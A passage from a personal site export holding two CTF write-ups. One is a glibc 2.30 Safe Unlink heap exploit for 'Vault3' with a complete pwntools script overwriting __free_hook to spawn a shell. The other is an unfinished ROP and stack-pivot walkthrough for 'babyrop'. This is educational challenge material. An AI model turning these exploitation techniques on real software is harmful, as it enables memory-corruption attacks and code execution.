
[{"content":" Welcome to My Digital Garden # Planting bytes, growing ideas.\nHi, I’m D3LET3-57 — welcome to a space where I share notes, projects, and things I’m learning.\nThis is a quiet place for deep dives, random thoughts, and technical experiments.\nAbout Me # Cybersecurity Enthusiast\nI enjoy exploring reverse engineering, CTFs, and low-level systems.\nProgrammer\nI write code in Python, C++, Assembly, and whatever else the project calls for.\nAI Explorer\nI’m curious about language models, AI tools, and their unexpected uses.\nWhat You’ll Find Here # Not a blog. Just an evolving notebook.\nCTF Writeups\nNotes and walkthroughs from challenges I’ve solved.\nTech \u0026amp; AI Experiments\nTools I’m building, concepts I’m testing, and what I’ve learned.\nIdeas \u0026amp; Notes\nShort thoughts, unfinished concepts, and other bits I don’t want to forget.\nWhy “D3LET3-57”? # Because “Delete” was taken — and this one sticks.\nThanks for reading.\nFeel free to explore, learn, or just bookmark something for later.\n","date":"2025-08-18","externalUrl":null,"permalink":"/","section":"","summary":"Welcome to My Digital Garden # Planting bytes, growing ideas.\nHi, I’m D3LET3-57 — welcome to a space where I share notes, projects, and things I’m learning.\nThis is a quiet place for deep dives, random thoughts, and technical experiments.","title":"","type":"page"},{"content":" Welcome to My Digital Notebook # Here, I share notes and insights on what I\u0026rsquo;m learning—CTFs, AI, coding, and all things tech.\nTopics Covered # Cybersecurity AI \u0026amp; Machine Learning Programming Random Experiments This is simply a space to collect thoughts and discoveries.\nHope you find something helpful here!\n","date":"2025-08-18","externalUrl":null,"permalink":"/posts/","section":"","summary":"Welcome to My Digital Notebook # Here, I share notes and insights on what I\u0026rsquo;m learning—CTFs, AI, coding, and all things tech.\nTopics Covered # Cybersecurity AI \u0026amp; Machine Learning Programming Random Experiments This is simply a space to collect thoughts and discoveries.","title":"","type":"posts"},{"content":"","date":"2025-08-18","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"2025-08-18","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"","date":"2025-08-18","externalUrl":null,"permalink":"/tags/heap/","section":"Tags","summary":"","title":"Heap","type":"tags"},{"content":"","date":"2025-08-18","externalUrl":null,"permalink":"/categories/heap/","section":"Categories","summary":"","title":"Heap","type":"categories"},{"content":"","date":"2025-08-18","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"2025-08-18","externalUrl":null,"permalink":"/categories/safe-unlink/","section":"Categories","summary":"","title":"Safe Unlink","type":"categories"},{"content":" Script CTF - Vault3 Challenge Writeup # 0x00 - Initial Analysis # Challenge Description # Welcome to Connor\u0026rsquo;s Fantastic Vault, where you can store all your valuables. We have gone through many renovations in our security and hopefully there should be no more hacks in our system.\n(Note: this binary uses glibc version 2.30 without tcache)\nThe note about the glibc version is a critical hint for solving this challenge. Binary Security # First, let\u0026rsquo;s examine the binary\u0026rsquo;s security properties using checksec.\n$ checksec vault_patched [*] \u0026#39;/home/delete/CTFs/ScriptCTF/vault3/vault_patched\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b\u0026#39;.\u0026#39; I used pwninit to patch the binary, setting RUNPATH to the current directory. This ensures the provided libc.so.6 is loaded instead of the system\u0026rsquo;s default library.\n0x01 - Vulnerability Analysis: Safe Unlink # The binary has a UAF vuln( Not removing the pointer after freeing it) but it has no use due to only being able to malloc 2 times.\nFree chunk goes to unsorted bin and in this condition we can\u0026rsquo;t corrupt the head of linked list due to an unusual memory saving property of unsorted bin which is to merge into topchunk. The exploit below uses the Heap overflow vuln.\nThe challenge note explicitly states that the binary uses a glibc version without tcache. This means that freed chunks of appropriate sizes will be placed into the unsorted bin, which uses a doubly linked list to manage its free chunks. This structure is central to the classic \u0026ldquo;unlink\u0026rdquo; attack.\nWhat is Unlink? # Unlink is the process of removing a chunk from a doubly linked list of free chunks. By exploiting a vulnerability like a heap overflow, an attacker can corrupt the forward (fd) and backward (bk) pointers of a free chunk before it gets unlinked.\nA free chunk P in a bin is structured as follows (simplified):\nstruct malloc_chunk { size_t mchunk_prev_size; /* Size of previous chunk (if free). */ size_t mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* Forward pointer in the doubly linked list. */ struct malloc_chunk* bk; /* Backward pointer in the doubly linked list. */ // ... more fields for large bins }; When malloc unlinks chunk P, it performs the following pointer updates to mend the list:\n// Let FD be P-\u0026gt;fd and BK be P-\u0026gt;bk FD-\u0026gt;bk = BK; BK-\u0026gt;fd = FD; If an attacker controls P-\u0026gt;fd and P-\u0026gt;bk, they can trigger an arbitrary write. For example, setting P-\u0026gt;fd to an address TARGET_ADDR - 0x18 and P-\u0026gt;bk to a pointer PTR would cause the unlink macro to write PTR to TARGET_ADDR.\nThe Safe Unlink Mitigation # To prevent this attack, modern glibc versions implement a security check known as \u0026ldquo;Safe Unlink\u0026rdquo;. Before performing the pointer manipulation, malloc verifies the integrity of the list:\n// Check if P is correctly linked between its neighbors if (P-\u0026gt;fd-\u0026gt;bk != P || P-\u0026gt;bk-\u0026gt;fd != P) { // If the check fails, the program aborts. malloc_printerr(\u0026#34;corrupted double-linked list\u0026#34;); } This check ensures that P\u0026rsquo;s forward neighbor points back to P, and P\u0026rsquo;s backward neighbor also points back to P. This validation makes the classic unlink attack impossible, as we cannot simply point fd and bk to arbitrary locations. However, we can still achieve an exploit by carefully crafting our heap layout to satisfy these checks.\n0x02 - The Attack Plan # My initial attempts to perform a classic unlink attack failed with the corrupted double-linked list error, confirming that the Safe Unlink mitigation is active.\nThe strategy must therefore be to bypass this check. We can achieve this by finding a writable address in memory that points to a location we control. By setting a chunk\u0026rsquo;s fd and bk pointers to this address, we can satisfy the P-\u0026gt;fd-\u0026gt;bk == P and P-\u0026gt;bk-\u0026gt;fd == P conditions, tricking malloc into performing the unlink and granting us a powerful write primitive.\n0x03 - Exploit Development # Lets open our binary in gdb and analyze the heap layout.\nStarting program: /home/delete/CTFs/ScriptCTF/vault3/vault_patched puts address is 0x7ffff786faf0 Welcome 1. Create Vault 2. Store stuff in vault 3. Free vault 4. Exit \u0026gt; There is a libc leak which is useful in further exploit development.\nNow let\u0026rsquo;s allocate two chunks and inspect the heap layout.\nUnderstanding Unsorted bins # pwndbg\u0026gt; vis 0x405000\t0x0000000000000000\t0x0000000000000091\t................ 0x405010\t0x0000000000000000\t0x0000000000000000\t................ 0x405020\t0x0000000000000000\t0x0000000000000000\t................ 0x405030\t0x0000000000000000\t0x0000000000000000\t................ 0x405040\t0x0000000000000000\t0x0000000000000000\t................ 0x405050\t0x0000000000000000\t0x0000000000000000\t................ 0x405060\t0x0000000000000000\t0x0000000000000000\t................ 0x405070\t0x0000000000000000\t0x0000000000000000\t................ 0x405080\t0x0000000000000000\t0x0000000000000000\t................ 0x405090\t0x0000000000000000\t0x0000000000000091\t................ 0x4050a0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050b0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050c0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050d0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050e0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050f0\t0x0000000000000000\t0x0000000000000000\t................ 0x405100\t0x0000000000000000\t0x0000000000000000\t................ 0x405110\t0x0000000000000000\t0x0000000000000000\t................ 0x405120\t0x0000000000000000\t0x0000000000020ee1\t................ \u0026lt;-- Top chunk As you can see we have allocated two chunks of size 0x90.\nNow let\u0026rsquo;s free first chunk and see what happens.\npwndbg\u0026gt; vis 0x405000\t0x0000000000000000\t0x0000000000000091\t................\t\u0026lt;-- unsortedbin[all][0] 0x405010\t0x00007ffff7bb4bc0\t0x00007ffff7bb4bc0\t.K.......K...... 0x405020\t0x0000000000000000\t0x0000000000000000\t................ 0x405030\t0x0000000000000000\t0x0000000000000000\t................ 0x405040\t0x0000000000000000\t0x0000000000000000\t................ 0x405050\t0x0000000000000000\t0x0000000000000000\t................ 0x405060\t0x0000000000000000\t0x0000000000000000\t................ 0x405070\t0x0000000000000000\t0x0000000000000000\t................ 0x405080\t0x0000000000000000\t0x0000000000000000\t................ 0x405090\t0x0000000000000090\t0x0000000000000090\t................ 0x4050a0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050b0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050c0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050d0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050e0\t0x0000000000000000\t0x0000000000000000\t................ 0x4050f0\t0x0000000000000000\t0x0000000000000000\t................ 0x405100\t0x0000000000000000\t0x0000000000000000\t................ 0x405110\t0x0000000000000000\t0x0000000000000000\t................ 0x405120\t0x0000000000000000\t0x0000000000020ee1\t................\t\u0026lt;-- Top chunk You can see that the first chunk has been added to the unsorted bin, while the second chunk remains allocated. fd and bk now point to main_arena where our chunk address is stored\nall: 0x405000 —▸ 0x7ffff7bb4bc0 (main_arena+96) ◂— 0x405000 Did you observe at 0x405090? The value of is 0x90 which is prev_size and also prev_insuse bit is also cleared indicating that the previous chunk is freed. This behaviour is not shown in the tcache.\nThe chunks which are adjacent to top chunk that are too large qualify for fast bins are consolidated into the top chunk\nTry this by freeing chunk 0x405090.\npwndbg\u0026gt; vis 0x405000\t0x0000000000000000\t0x0000000000021001\t................\t\u0026lt;-- Top chunk You can observe that both allocated chunks have been consolidated into the top chunk, because both chunks are freed and they are adjacent to each other.\nOverwriting fd and bk pointers # Now that we have understood how Unsorted bin works. Let\u0026rsquo;s try to exploit it.\nThere is a heap overflow bug in this challenge we can use this to overwrite the next chunks size field. How can we abuse this?\nWe can trick free function to think that the previous is freed by setting prev_inuse bit to 0.\nNow it\u0026rsquo;s time to abuse fd and bk pointers 😈 # free_hook = libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc.symbols[\u0026#39;system\u0026#39;] prev_size = 0x90 fake_size = 0x90 payload = p64(free_hook) + p64(system) + p8(0)*0x70 + p64(prev_size) + p64(fake_size) Let\u0026rsquo;s send this payload and check in gdb.\n0x14f11000\t0x0000000000000000\t0x0000000000000091\t................ 0x14f11010\t0x000077cda23b6e20\t0x000077cda2043200\tn;..w...2...w.. 0x14f11020\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11030\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11040\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11050\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11060\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11070\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11080\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11090\t0x0000000000000090\t0x0000000000000090\t................ 0x14f110a0\t0x0000000000000000\t0x0000000000000000\t................ 0x14f110b0\t0x0000000000000000\t0x0000000000000000\t................ 0x14f110c0\t0x0000000000000000\t0x0000000000000000\t................ 0x14f110d0\t0x0000000000000000\t0x0000000000000000\t................ 0x14f110e0\t0x0000000000000000\t0x0000000000000000\t................ 0x14f110f0\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11100\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11110\t0x0000000000000000\t0x0000000000000000\t................ 0x14f11120\t0x0000000000000000\t0x0000000000020ee1\t................\t\u0026lt;-- Top chunk We have overwritten fd with freehook and bk with system.\n// Let FD be P-\u0026gt;fd and BK be P-\u0026gt;bk FD-\u0026gt;bk = BK; BK-\u0026gt;fd = FD; When this happens, it write our system address into freehook and when we call free it triggers system function. Let\u0026rsquo;s try to free second chunk so that program thinks that first chunk is already in unsorted bin and it is eligible for consolidation therefore it proceeds to unlink.\nBut it doesn\u0026rsquo;t work. It throws corrupted double-linked list at your face.\nWhy this is happening?\nif (P-\u0026gt;fd-\u0026gt;bk != P || P-\u0026gt;bk-\u0026gt;fd != P) This check is ensuring that the forward and backward pointers are consistent with the current chunk being unlinked. If they are not, it indicates a corruption in the double-linked list structure, hence the error. We need fd and bk pointers such that when the check happens it points to current chunk.\nIf you open binary in IDA or Gidra you can observe that our allocated pointers are stored in binary named as vaults.\npwndbg\u0026gt; dq \u0026amp;vaults 0000000000404090 0000000000405010 00000000004050a0 00000000004040a0 0000000000000000 0000000000000000 00000000004040b0 0000000000000000 0000000000000000 00000000004040c0 0000000000000000 0000000000000000 What if we use vaults address as fd and bk pointers? This way, we can ensure that the double-linked list structure remains intact during the unlinking process, and we can successfully exploit the vulnerability.\nfd = elf.sym.vaults-0x18 bk = elf.sym.vaults-0x10 In fd first two 8 bytes goes for heap metadata and 4th quadword points to our pointer. Similarly, in bk first two 8 bytes goes for heap metadata and 3rd quadword points to our pointer.\nWe can bypass the check easily and trigger the unlinking process without any issues.\nNow let\u0026rsquo;s free the second chunk.\npayload = p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size) Oopss! We again encountered corrupted double-linked list error. This is because malloc uses metadata pointers i.e in this case the pointer should be 0x405000 but we are passing 0x405010 so it tries to look for fd and bk at 0x405020 and 0x405028 instead of 0x405010 and 0x405018.\nLet\u0026rsquo;s Craft a fake chunk.\nprev_size = 0x80 fake_size = 0x90 fd = elf.sym.vaults-24 bk = elf.sym.vaults-0x10 payload = p64(0) + p64(0x80) # Heap metadata payload += p64(fd) + p64(bk) # fd and bk payload += p8(0)*0x60 payload += p64(prev_size) + p64(fake_size) Now lets run again and try to free second chunk. Lets inspect the memory layout.\nDon\u0026rsquo;t use vis in pwndbg after free instead use dq mp_.sbrk_base to check heap pwndbg\u0026gt; dq mp_.sbrk_base 00000000095a8000 0000000000000000 0000000000000091 00000000095a8010 0000000000000000 0000000000020ff1 00000000095a8020 0000000000404078 0000000000404080 00000000095a8030 0000000000000000 0000000000000000 pwndbg\u0026gt; dq \u0026amp;vaults 0000000000404090 0000000000404078 00000000095a80a0 00000000004040a0 0000000000000000 0000000000000000 00000000004040b0 0000000000000000 0000000000000000 00000000004040c0 0000000000000000 0000000000000000 pwndbg\u0026gt; dq 0x404070 0000000000404070 00007fbbf53b4960 0000000000000000 0000000000404080 00007fbbf53b55a0 0000000000000000 0000000000404090 0000000000404078 00000000095a80a0 00000000004040a0 0000000000000000 0000000000000000 You can see that the first entry of vaults is 0x0404078 which is 0x18 bytes away from it. Effectively it allocated a chunk which is 0x18 bytes away from vaults. So if we try to write in first chunk which is not freed we end up writing at 0x0404078.\nfree(1) edit(0,p64(0xcafebabedeadbeef)) pwndbg\u0026gt; dq 0x404070 0000000000404070 00007697e21b4960 cafebabedeadbeef 0000000000404080 00007697e21b550a 0000000000000000 0000000000404090 0000000000404078 000000002c69c0a0 00000000004040a0 0000000000000000 0000000000000000 Final Stage of exploitation # Approach-1 # Now let\u0026rsquo;s try to overwrite the vaults first entry to __free_hook.\nedit(0, p64(0)*3 + p64(free_hook-0x8)) Why __free_hook-0x8?\nWe dont have /bin/sh\\x00 string so lets write it at __free_hook-0x8 and __free_hook with system address. Effectively we are calling system('/bin/sh\\x00')\nedit(0, p64(0)*3 + p64(free_hook-0x8)) edit(0,b\u0026#39;/bin/sh\\x00\u0026#39;+p64(system)) Approach-2 # edit(0, b\u0026#34;X\u0026#34;*0x18 + p64(libc.sym.__free_hook) + p64(0x08) + p64(next(libc.search(\u0026#34;/bin/sh\u0026#34;)))) edit(0, p64(libc.sym.system)) Use the \u0026ldquo;edit\u0026rdquo; option to overwrite the first entry in vaults again with the address of the free hook.\nSet the request size value of this entry to 8 and set up a pointer to an existing /bin/sh string in another vaults entry.\nUse the \u0026ldquo;edit\u0026rdquo; option once more to overwrite the free hook with the address of system().\nFinally, lets use free to get shell!!\nFor those who are still confused what\u0026rsquo;s happening here I will try to explain.\n# I guess you understood till the point where we set up fd and bk pointers. What\u0026rsquo;s happening after free(1)?\nUnlink check is passed and we are effectively getting permission to write at vaults-0x18. How it\u0026rsquo;s happening?\nRemember the Unlink Process?\n// Let FD be P-\u0026gt;fd and BK be P-\u0026gt;bk FD-\u0026gt;bk = BK; BK-\u0026gt;fd = FD; Here FD is vaults-0x18 and BK is vaults-0x10. So effectively we are writing the address of vaults-0x18 into vaults i.e we are changing the malloc pointer to vaults-0x18.\nedit(0, p64(0)*3 + p64(free_hook-0x8)) After this step we are effectively writing the address of free_hook-0x8 into vaults, i.e we are changing the malloc pointer to free_hook-0x8.\nSo we can use the edit function to write the /bin/sh string and the system address into the appropriate locations.\n0x04 Exploit Script # from pwn import * elf = context.binary = ELF(\u0026#39;./vault_patched\u0026#39;) libc = elf.libc def malloc(index): p.sendline(b\u0026#39;1\u0026#39;) p.sendline(str(index).encode()) def edit(index, data): p.sendline(b\u0026#39;2\u0026#39;) p.sendline(str(index).encode()) p.sendline(data) def free(index): p.sendline(b\u0026#39;3\u0026#39;) p.sendline(str(index).encode()) p = process(\u0026#39;./vault_patched\u0026#39;) p.recvuntil(b\u0026#39;0x\u0026#39;) leak = int(p.recvline().strip(), 16) log.critical(f\u0026#34;Leak: {leak:#x}\u0026#34;) libc.address = leak - 0x6faf0 log.info(f\u0026#34;Libc base: {libc.address:#x}\u0026#34;) malloc(0) malloc(1) free_hook = libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc.symbols[\u0026#39;system\u0026#39;] log.critical(f\u0026#34;Free hook: {free_hook:#x}\u0026#34;) log.critical(f\u0026#34;System: {system:#x}\u0026#34;) prev_size = 0x80 fake_size = 0x90 fd = elf.sym.vaults-24 bk = elf.sym.vaults-0x10 payload = p64(0) + p64(0x80)+ p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size) edit(0, payload) free(1) edit(0, p64(0)*3 + p64(free_hook-0x8)) edit(0,b\u0026#39;/bin/sh\\x00\u0026#39;+p64(system)) free(0) # gdb.attach(p) p.interactive() 0x05 Summary # This writeup demonstrates a comprehensive Safe Unlink heap exploitation technique against the Vault3 challenge from ScriptCTF 2025. The challenge specifically uses glibc 2.30 without tcache, making it vulnerable to classic heap exploitation methods.\nKey Findings # Binary Analysis:\n64-bit ELF with minimal protections (no PIE, no canaries, partial RELRO) Heap overflow vulnerability in the vault storage functionality Global vaults array storing heap pointers at a known address Exploitation Strategy:\nUnderstanding the Environment: The absence of tcache means freed chunks go directly to unsorted bins, enabling traditional unlink attacks Bypassing Safe Unlink: Modern glibc implements integrity checks (P-\u0026gt;fd-\u0026gt;bk == P \u0026amp;\u0026amp; P-\u0026gt;bk-\u0026gt;fd == P) to prevent arbitrary writes Crafting the Attack: Created a fake chunk with carefully calculated fd and bk pointers targeting the global vaults array Achieving Arbitrary Write: Successfully triggered unlink operation to gain write-what-where primitive Code Execution: Overwrote __free_hook with system address and /bin/sh string to spawn a shell Technical Highlights # Safe Unlink Bypass: Used vaults-24 and vaults-16 as fd/bk pointers to satisfy integrity checks Fake Chunk Construction: Precisely crafted heap metadata to fool malloc\u0026rsquo;s chunk validation Memory Layout Control: Leveraged heap overflow to manipulate adjacent chunk headers and trigger consolidation Hook Hijacking: Exploited __free_hook mechanism for reliable code execution The exploit demonstrates the enduring relevance of classic heap exploitation techniques in environments without modern mitigations like tcache, showcasing how fundamental understanding of glibc internals remains crucial for security research.\nReferences # https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-unsafe-unlink-part-4-3-75e00e1b0c68\n","date":"2025-08-18","externalUrl":null,"permalink":"/posts/vault3/","section":"","summary":"A detailed writeup for the Vault3 challenge from ScriptCTF 2025, focusing on a Safe Unlink heap exploitation technique.","title":"ScriptCTF - Vault3 Challenge Writeup","type":"posts"},{"content":"","date":"2025-08-18","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2025-08-18","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"2025-06-16","externalUrl":null,"permalink":"/categories/rop/","section":"Categories","summary":"","title":"Rop","type":"categories"},{"content":" Smiley CTF - babyrop Writeup # 0x00 - Overview # Checksec on given binary:\n➜ babyrop checksec vuln [*] \u0026#39;/home/delete/CTFs/SmileyCTF/babyrop/vuln\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) This challenge is mixture of ROP, Stack Pivot and libc leak.\n0x01 - Initial Analysis # Now I will try to explain how to solve this challenge step by step. We have given buffer space of 0x20 bytes and there is buffer overflow vulnerability. We can use this to overwrite the variables. Hmm.. seems simple, right? But wait, there is a catch. We don\u0026rsquo;t have proper gadgets in given binary. So we have to use libc gadgets to solve this challenge. To use them we need to libc address. We can do it by leaking puts address through GOT table. After that we can calculate libc base address and then we can use libc gadgets to solve this challenge.\nOn my first attempt I managed to leak libc address but due to leave; ret instruction, there is no valid data present at my rbp. Value of rbp is 0x0 and it is not valid address it will cause segmentation fault. So I have to use stack pivot technique to solve this challenge.\nMy Intial Script:\nfrom pwn import * elf = context.binary = ELF(\u0026#39;./vuln_patched\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) gs = \u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;\u0026#39; p = process() gdb.attach(p,gdbscript=gs) payload = b\u0026#39;A\u0026#39;*8*4 payload += p64(0x000000404010+0x20) # rbp to puts@got + 0x20 payload += p64(0x0000000000401211) # rip to puts payload += p64(0x4011cf) # main address p.sendline(payload) p.recvline() s = p.recvall(timeout=1) s = s[:-1] addr = int.from_bytes(s, \u0026#39;little\u0026#39;) log.info(f\u0026#39;libc Leak: {hex(addr)}\u0026#39;) libc.address = addr - libc.sym[\u0026#39;puts\u0026#39;] log.info(f\u0026#39;libc base: {hex(libc.address)}\u0026#39;) p.interactive() Why I used 0x000000404010+0x20 as rbp? Because we have 0x20 bytes buffer space.\n=\u0026gt; 0x0000000000401211 \u0026lt;+66\u0026gt;:\tmov rdx,QWORD PTR [rip+0x2df8] # 0x404010 \u0026lt;print\u0026gt; 0x0000000000401218 \u0026lt;+73\u0026gt;:\tlea rax,[rbp-0x20] 0x000000000040121c \u0026lt;+77\u0026gt;:\tmov rdi,rax 0x000000000040121f \u0026lt;+80\u0026gt;:\tcall rdx 0x0000000000401221 \u0026lt;+82\u0026gt;:\tmov eax,0x0 0x0000000000401226 \u0026lt;+87\u0026gt;:\tleave 0x0000000000401227 \u0026lt;+88\u0026gt;:\tret We can see that print function is called with rbp-0x20 as argument. So we have to set rbp to 0x000000404010+0x20 to make it work.\nNow we can leak puts address and calculate libc base address. After that we can use libc gadgets to solve this challenge.\nSince there is no valid data at rbp, we are expected to see this in gdb:\n0x0000000000000000 in ?? () LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA ───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────── *RAX 0 RBX 0x7fff651e32e8 —▸ 0x7fff651e5195 ◂— \u0026#39;/home/delete/CTFs/SmileyCTF/babyrop/vuln_patched\u0026#39; *RCX 0x70b17c71c574 (write+20) ◂— cmp rax, -0x1000 /* \u0026#39;H=\u0026#39; */ *RDX 0 *RDI 0x70b17c805710 (_IO_stdfile_1_lock) ◂— 0 *RSI 0x70b17c804643 (_IO_2_1_stdout_+131) ◂— 0x805710000000000a /* \u0026#39;\\n\u0026#39; */ *R8 6 R9 0x70b17ca0a380 (_dl_fini) ◂— endbr64 R10 0x7fff651e2ee0 ◂— 0x800000 *R11 0x202 R12 1 R13 0 R14 0x403dc8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401140 (__do_global_dtors_aux) ◂— endbr64 R15 0x70b17ca3d000 (_rtld_global) —▸ 0x70b17ca3e2e0 ◂— 0 *RBP 0 *RSP 0x404040 ◂— 0 *RIP 0 ────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────── Invalid address 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x404040 ◂— 0 ... ↓ 7 skipped ────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► 0 0x0 None 1 0x0 None ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── We can see rip is 0x0 and rbp is 0x0. So we can use stack pivot technique to solve this challenge.\n0x02 - Exploit # Now we have basic idea of how to solve this challenge. Let\u0026rsquo;s start abusing this challenge.\npayload = flat({ 0x20:0x404038 + 0x20, #Setting this as RBP 0x28:0x0000000000401205, # RIP --\u0026gt; gets of main }) This is our first payload. We are setting rbp to 0x404038 + 0x20 and rip to 0x0000000000401205 which is gets address in main function. After this we can use gets to read our next payload.\nWhat it does?\nIt simply calls gets(0x404038) to take our input Why calling gets? To overcome the issue we are facing with leave; ret instruction. We can use gets to write some valid address at rbp so that when leave; ret is executed, it will not cause segmentation fault.\npayload = flat({ 0: [ pop_rbp, # pop rbp 0x0000000000404150, # points to main address in .bss leave_ret # leave ; ret ], 0x20: elf.sym.print + 0x20, # RBP --\u0026gt; @puts+0x20 0x28: [ 0x401227, # increasing the stack space 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x0000000000401211, elf.sym.main] # This is the value at address 0x0000000000404150 }) This is our second payload. We are setting rbp to puts+0x20 and rip to 0x0000000000401211 which is puts address in main function. After this we can leak the puts address and calculate the libc base address.\nAnswering Some Questions:\nWhat is the need to increase to stack by padding ret instruction?\nIf you directly invoke functions like puts(), the program may crash because puts() and similar functions make several nested calls, each creating its own stack frame (typically via sub rsp, ...). In this challenge, the stack is pivoted into the .bss section, which is writable, but if the stack pointer (rsp) moves into a non-writable region (like 0x403000), any further stack operations will cause a segmentation fault.\nTo prevent this, we use a sequence of dummy instructions (such as repeated ret or pop gadgets) to incrementally move the stack pointer deeper into the writable .bss section. This ensures that all subsequent function calls have enough writable stack space for their frames, avoiding stack underflows into non-writable memory and preventing crashes.\npwndbg\u0026gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File 0x400000 0x401000 r--p 1000 0 /home/delete/CTFs/SmileyCTF/babyrop/vuln 0x401000 0x402000 r-xp 1000 1000 /home/delete/CTFs/SmileyCTF/babyrop/vuln 0x402000 0x403000 r--p 1000 2000 /home/delete/CTFs/SmileyCTF/babyrop/vuln 0x403000 0x404000 r--p 1000 2000 /home/delete/CTFs/SmileyCTF/babyrop/vuln 0x404000 0x405000 rw-p 1000 3000 /home/delete/CTFs/SmileyCTF/babyrop/vuln 0x7ffff7c00000 0x7ffff7c28000 r--p 28000 0 /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7c28000 0x7ffff7db0000 r-xp 188000 28000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7db0000 0x7ffff7dff000 r--p 4f000 1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7dff000 0x7ffff7e03000 r--p 4000 1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7e03000 0x7ffff7e05000 rw-p 2000 202000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7e05000 0x7ffff7e12000 rw-p d000 0 [anon_7ffff7e05] 0x7ffff7f9e000 0x7ffff7fa1000 rw-p 3000 0 [anon_7ffff7f9e] 0x7ffff7fbd000 0x7ffff7fbf000 rw-p 2000 0 [anon_7ffff7fbd] 0x7ffff7fbf000 0x7ffff7fc3000 r--p 4000 0 [vvar] 0x7ffff7fc3000 0x7ffff7fc5000 r-xp 2000 0 [vdso] 0x7ffff7fc5000 0x7ffff7fc6000 r--p 1000 0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7fc6000 0x7ffff7ff1000 r-xp 2b000 1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7ff1000 0x7ffff7ffb000 r--p a000 2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7ffb000 0x7ffff7ffd000 r--p 2000 36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7ffd000 0x7ffff7fff000 rw-p 2000 38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack] 0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall] Why 0x0000000000404150 is used as rbp?\nWe are setting the value at 0x0000000000404150 to the address of main function in .bss section. You ask why? Because when we counter leave; ret instruction, in out payload-1 first it changes to our rbp to 0x404058 and next we are using gets function to our next payload.\nYou can see register values in gdb: RBP 0x404058 ◂— 0 RSP 0x7ffd17b46090 —▸ 0x7ffd17b46000 —▸ 0x7ffd17b46050 —▸ 0x7ffd17b46080 —▸ 0x404058 ◂— ... *RIP 0x40120c (main+61) ◂— call gets Here comes the best part in this challenge, when we call gets function, it will read the input and write it to 0x404058 which is our rbp. So when leave; ret instruction is executed, it will not cause segmentation fault because now rbp has valid address.\nSo now register values will be: RBP 0x404058 —▸ 0x404030 ◂— 0 RSP 0x7ffd17b46090 —▸ 0x7ffd17b46000 —▸ 0x7ffd17b46050 —▸ 0x7ffd17b46080 —▸ 0x404058 ◂— ... *RIP 0x40121f (main+80) ◂— call rdx Now when program executes leave; ret instruction, our new rsp changes to 0x404030. Remember what we 